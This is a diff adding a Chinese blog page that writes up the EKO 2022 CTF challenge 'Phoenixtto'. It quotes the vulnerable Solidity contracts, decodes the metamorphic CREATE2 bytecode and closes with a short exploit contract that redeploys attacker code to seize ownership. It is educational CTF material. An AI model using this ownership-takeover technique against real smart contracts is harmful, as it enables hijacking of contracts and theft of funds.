@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="Thomas_Xu&#39;s Bolg">
+    <meta name="keyword"  content="Thomas_Xu, BlockChain">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          CTF-EKO-Phoenixtto - Thomas_Xu
+        
+    </title>
+
+    <link rel="canonical" href="https://thomasxu-blockchain.github.io/EKO-Phoenixtto/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="../css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="../css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="../css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="../css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="../css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="../css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="../css/widget.css">
+
+
+    
+<link rel="stylesheet" href="../css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="../css/signature.css">
+
+
+    
+<link rel="stylesheet" href="../css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="../css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('Iron-Man-3.jpg')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#EKO" title="EKO">EKO</a>
+                            
+                        </div>
+                        <h1>CTF-EKO-Phoenixtto</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Thomas_Xu on
+                            2023-02-25
+                        </span>
+
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Thomas_Xu&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="CTF-EKO-Phoenixtto"><a href="#CTF-EKO-Phoenixtto" class="headerlink" title="CTF-EKO-Phoenixtto"></a>CTF-EKO-Phoenixtto</h1><hr>
+<pre><code>author：Thomas_Xu
+</code></pre><p>从今天开始更新CTF-EKO系列，这貌似是<code>ethernaut</code>靶场的研发团队举办的一个CTF。</p>
+<p>题目链接：<a href="https://www.ctfprotocol.com/tracks/eko2022/phoenixtto" target="_blank" rel="noopener">https://www.ctfprotocol.com/tracks/eko2022/phoenixtto</a></p>
+<p>先来看第一个题：</p>
+<blockquote>
+<p>在跨界世界中，有一个特殊的跨界世界，口袋妖怪、哈利波特和 solidity 的宇宙交织在一起。在这个交叉中，在邓布利多的凤凰之间创造了一个混合生物，一个野生的同上，因为我们在固体宇宙中，这个生物是一个合同。我们称它为 Phoenixtto，它有两个重要的能力，一个是在它被破坏后从它的灰烬中重生，另一个是复制另一个字节码的行为。<br>如果可以，请尝试捕获 Phhoenixtto…</p>
+</blockquote>
+<p>这个题目描述还挺有意思，不过也给了我一点思路，<code>灰烬中重生``复制字节码</code>听上去很有意思，难道和<code>selfdestroy</code>有关？</p>
+<p>还是先来看代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@title <span class="variable">Phoenixtto</span></span></span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@author </span>Rotcivegaf https://twitter.com/victor93389091 &lt;victorfage<span class="doctag">@gmail</span>.com&gt;</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@dev </span>Within the world of crossovers there is a special one, where the universes of pokemon,</span></span><br><span class="line"><span class="comment"> *         harry potter and solidity intertwine.</span></span><br><span class="line"><span class="comment"> *         In this crossover a mix creature is created between dumbledore's phoenix, a wild ditto and</span></span><br><span class="line"><span class="comment"> *         since we are in the solidity universe this creature is a contract.</span></span><br><span class="line"><span class="comment"> *         We have called it Phoenixtto and it has two important abilities, that of being reborn from</span></span><br><span class="line"><span class="comment"> *         it's ashes after its destruction and that of copying the behavior of another bytecode</span></span><br><span class="line"><span class="comment"> *         Try to capture the Phoenixtto, if you can...</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@custom</span>:url https://www.ctfprotocol.com/tracks/eko2022/phoenixtto</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract Laboratory &#123;</span><br><span class="line">    address immutable PLAYER;</span><br><span class="line">    address public getImplementation;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address _player) &#123;</span><br><span class="line">        PLAYER = _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mergePhoenixDitto</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        reBorn(type(Phoenixtto).creationCode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reBorn</span>(<span class="params">bytes memory _code</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        address x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create(<span class="number">0</span>, add(<span class="number">0x20</span>, _code), mload(_code))</span><br><span class="line">        &#125;</span><br><span class="line">        getImplementation = x;</span><br><span class="line"></span><br><span class="line">        _code = hex<span class="string">"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3"</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create2(<span class="number">0</span>, add(_code, <span class="number">0x20</span>), mload(_code), <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        addr = x;</span><br><span class="line">        Phoenixtto(x).reBorn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isCaught</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Phoenixtto(addr).owner() == PLAYER;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Phoenixtto &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    bool private _isBorn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reBorn</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (_isBorn) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        _isBorn = <span class="literal">true</span>;</span><br><span class="line">        owner = address(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">capture</span>(<span class="params">string memory _newOwner</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!_isBorn || msg.sender != tx.origin) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));</span><br><span class="line">        <span class="keyword">if</span> (newOwner == msg.sender) &#123;</span><br><span class="line">            owner = newOwner;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            selfdestruct(payable(msg.sender));</span><br><span class="line">            _isBorn = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>粗略一读代码，这里出现了Create2和selfdestruct，结合题目的暗示，我估计玄机就在此处。</p>
+<p>但？这二者有什么联系吗？</p>
+<p>先不管了，看看Factory吧，因为Factory能看到判题标准，我们目标才能更明确。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deploy</span>(<span class="params">address _player</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">address[] memory ret</span>) </span>&#123;</span><br><span class="line">       <span class="built_in">require</span>(msg.value == <span class="number">0</span>, <span class="string">"dont send ether"</span>);</span><br><span class="line">       address _challenge = address(<span class="keyword">new</span> Laboratory(_player));</span><br><span class="line">       Laboratory(_challenge).mergePhoenixDitto();</span><br><span class="line">       ret = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">       ret[<span class="number">0</span>] = _challenge;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params">address[] calldata _challenges</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">       <span class="comment">// @dev to win this challenge you must drain the contract</span></span><br><span class="line">       Laboratory _target = Laboratory(_challenges[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> _target.isCaught();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>这里只帖出来<code>deploy</code>和<code>isComplete</code>就够了，从Factory我们可以了解到这个题只需要<code>isCaught</code>返回true即可。</p>
+<p>也就是说要Phoenixtto的owner变为我们自己。那很自然而然地，唯一显式修改owner的地方在capture里。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`function capture(string memory _newOwner) external &#123;</span></span><br><span class="line"><span class="string">        if (!_isBorn || msg.sender != tx.origin) return;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));</span></span><br><span class="line"><span class="string">        if (newOwner == msg.sender) &#123;</span></span><br><span class="line"><span class="string">            owner = newOwner;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            selfdestruct(payable(msg.sender));</span></span><br><span class="line"><span class="string">            _isBorn = false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br></pre></td></tr></table></figure>
+<p>这里要进入要修改owner的判断，其实并不复杂。</p>
+<p>先来看看这个newOwner倒是是个啥吧：<code>address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));</code></p>
+<p>如果熟悉以太坊账户的生成流程的话，应该很快就能看出来这里就是一个公钥到地址的一个转换，取了公钥哈希的最后20个字节。</p>
+<p>那这个题就太简单了，只需要把自己公钥传进去就解题了。</p>
+<p>这个点可能是EKO故意出的一个“签到题”，但其实这个题深入研究的话，还有一个真正的漏洞。</p>
+<p>不难发现reBorn函数是比较关键的，我们重点分析：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reBorn</span>(<span class="params">bytes memory _code</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        address x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create(<span class="number">0</span>, add(<span class="number">0x20</span>, _code), mload(_code))</span><br><span class="line">        &#125;</span><br><span class="line">        getImplementation = x;</span><br><span class="line"></span><br><span class="line">        _code = hex<span class="string">"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3"</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create2(<span class="number">0</span>, add(_code, <span class="number">0x20</span>), mload(_code), <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        addr = x;</span><br><span class="line">        Phoenixtto(x).reBorn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isCaught</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Phoenixtto(addr).owner() == PLAYER;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>第一部分是Create，从Factory的调用可知，这里创建了Phoenixtto实例。该地址随后存储在状态变量中<code>getImplementation</code></p>
+<p>第二部分是个Create2，emmm这里用一串十六进制数重新赋值了code，看上去像是操作码，而Create2使用了这段操作码来初始化合约？这让我陷入短暂迷惑。</p>
+<p>必须是一些有效的字节码，否则操作<code>create2</code>会失败，对吧？</p>
+<p>但是，这些字节码究竟是什么意义？我在EVM playground上模拟了一下，这一串字节码节码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 0x5860208158601c335a63aaf10f428752fa158151803b80938091923cf3</span><br><span class="line">*</span><br><span class="line">* pc|op|name         | [stack]                                | &lt;memory&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第一个堆栈项设置为零 **</span><br><span class="line">* 00 58 getpc          [0]                                       &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第二个堆栈项设置为32，将是staticcall的长度参数 **</span><br><span class="line">* 01 60 push1</span><br><span class="line">* 02 20 outsize        [0, 32]                                   &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第三个堆栈项设置为0，将是staticcall的position参数 **</span><br><span class="line">* 03 81 dup2           [0, 32, 0]                                &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第四个堆栈项设置为4，将是staticcall的选择器长度参数 **</span><br><span class="line">* 04 58 getpc          [0, 32, 0, 4]                             &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第五个堆栈项设置为28，将是staticcall的选择器的position参数 **</span><br><span class="line">* 05 60 push1</span><br><span class="line">* 06 1c inpos          [0, 32, 0, 4, 28]                         &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第六个堆栈项设置为msg.sender，staticcall的目标地址 **</span><br><span class="line">* 07 33 caller         [0, 32, 0, 4, 28, caller]                 &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 讲第七个堆栈项设置为msg.gas, staticcall的gas限制 **</span><br><span class="line">* 08 5a gas            [0, 32, 0, 4, 28, caller, gas]            &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第八个堆栈项设置为选择器，通过mstore存储“what” **</span><br><span class="line">* 09 63 push4</span><br><span class="line">* 10 aaf10f42 selector [0, 32, 0, 4, 28, caller, gas, 0xaaf10f42]    &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第九个堆栈项设置为0，“where”通过mstore存储 ***</span><br><span class="line">* 11 87 dup8           [0, 32, 0, 4, 28, caller, gas, 0xaaf10f42, 0] &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 调用mstore，从堆栈中消耗8和9，将选择器放在内存中 **</span><br><span class="line">* 12 52 mstore         [0, 32, 0, 4, 0, caller, gas]             &lt;0xaaf10f42&gt;</span><br><span class="line">*</span><br><span class="line">* ** 调用staiccall，使用堆栈2到7，将地址放在内存中 **</span><br><span class="line">* 13 fa staticcall     [0, 1 (if successful)]                    &lt;address&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第二个堆栈项中的成功位翻转为0 **</span><br><span class="line">* 14 15 iszero         [0, 0]                                    &lt;address&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第三个0推送到堆栈，地址在内存中的位置 **</span><br><span class="line">* 15 81 dup2           [0, 0, 0]                                 &lt;address&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将地址从内存中的位置放到第三个堆栈项上 **</span><br><span class="line">* 16 51 mload          [0, 0, address]                           &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将地址放置到要使用的extcodesize的第四个堆栈项 **</span><br><span class="line">* 17 80 dup1           [0, 0, address, address]                  &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 获取extcodecopy的第四个堆栈项的extcodesize **</span><br><span class="line">* 18 3b extcodesize    [0, 0, address, size]                     &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** dup和swap大小，供init代码末尾的返回使用 **</span><br><span class="line">* 19 80 dup1           [0, 0, address, size, size]               &lt;&gt; </span><br><span class="line">* 20 93 swap4          [size, 0, address, size, 0]               &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将代码位置0推送到extcodecopy的堆栈和重新排序堆栈项 **</span><br><span class="line">* 21 80 dup1           [size, 0, address, size, 0, 0]            &lt;&gt;</span><br><span class="line">* 22 91 swap2          [size, 0, address, 0, 0, size]            &lt;&gt;</span><br><span class="line">* 23 92 swap3          [size, 0, size, 0, 0, address]            &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 调用extcodecopy，使用四项，将运行时代码克隆到内存 **</span><br><span class="line">* 24 3c extcodecopy    [size, 0]                                 &lt;code&gt;</span><br><span class="line">*</span><br><span class="line">* ** 返回以在内存中部署最终代码 **</span><br><span class="line">* 25 f3 return         []                                        *deployed!*</span><br></pre></td></tr></table></figure>
+<p>这里其实是有关Metamorphic Contracts的应用，相关链接：</p>
+<ul>
+<li><p>0age<a href="https://0age.medium.com/the-promise-and-the-peril-of-metamorphic-contracts-9eb8b8413c5e" target="_blank" rel="noopener">变质合约的承诺与危险</a></p>
+</li>
+<li><p>在Jason Carver 的<a href="https://medium.com/@jason.carver/defend-against-wild-magic-in-the-next-ethereum-upgrade-b008247839d2" target="_blank" rel="noopener">下一次以太坊升级中抵御“狂野魔法”</a></p>
+</li>
+<li><p>Metamorphic —由 0age<a href="https://github.com/0age/metamorphic" target="_blank" rel="noopener">创建变形（即可重新部署）合约的工厂合约</a></p>
+</li>
+<li><p>来自 a16zcrypto 的 Michael Blau 的<a href="https://a16zcrypto.com/metamorphic-smart-contract-detector-tool/" target="_blank" rel="noopener">检测变形智能合约的工具</a></p>
+</li>
+</ul>
+<p>这个概念背后的想法是能够更改合约中的代码并使其变形为其他东西。这利用了这样一个事实，即给定相同的输入，CREATE2 将始终将字节码部署到相同的地址。需要注意的一件重要事情是，使用的字节码是参数的一部分，也是用于生成地址的公式的一部分。因此，如果它发生变化，结果地址将因此发生变化。</p>
+<p>所有的magic都是由部署的字节码中的内容完成的（始终相同）<code>5860208158601c335a63aaf10f428752fa158151803b80938091923cf3</code>：. 只需几句话，它就会查询调用者，询问哪个是执行合约的地址，用作要部署的智能合约的源。</p>
+<p>通过这样做，虽然部署的合约是动态的，但生成的地址始终是相同的。</p>
+<p>而这里create2其实是使用的getImplementation的creationcode来部署的合约。应用此方法，Create2可以将不同的代码部署在一个地址上，从而实现“升级”。前提是旧合约必须被自毁，这样Create2再次在这个合约地址部署合约的时候才不会报错。</p>
+<p>分析到这里，解题思路已经很清晰了，就是利用这个“升级”漏洞，把该地址变为我们自己的攻击合约。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../ChallengePhoenixtto.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract ChallengePhoenixttoReborn &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reBorn</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ChallengePhoenixttoDeployer &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(address laboratory) &#123;</span><br><span class="line">        Laboratory(laboratory).reBorn(type(ChallengePhoenixttoReborn).creationCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/code-analysis3/" data-toggle="tooltip" data-placement="top" title="EVM源码分析（三）">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+                <div class="comment_notes_blank"></div>
+                <div class="visitor_notice">
+                    <img 
+                        src="/img/notice.png" 
+                        alt="notice"
+                        title="notice"/>
+                    <p class="notice">
+                        true
+                    </p>
+                </div>
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        This is copyright.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="../css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="../css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="../css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
